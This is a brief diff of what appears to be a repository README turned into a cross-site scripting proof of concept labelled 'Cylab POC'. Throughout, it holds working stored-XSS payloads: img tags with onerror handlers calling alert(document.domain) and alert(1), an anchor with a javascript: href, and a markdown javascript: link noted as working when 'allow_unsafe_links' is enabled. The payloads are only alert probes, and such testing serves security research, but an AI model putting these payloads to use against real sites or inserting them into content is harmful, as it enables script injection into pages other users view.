@@ -1,3 +1,15 @@
 This is a PoC
 <h1>heyy</h1>
 <img/src/onerror=alert(document.domain)>
+
+# Cylab POC
+
+<a id="poc-xss" href="javascript:alert('XSS via repository README')">
+  Click here
+</a>
+
+Or via a markdown link (if `allow_unsafe_links` is enabled):
+
+[Click me](javascript:alert('XSS via markdown link'))
+
+<img src="" onerror=alert(1)>
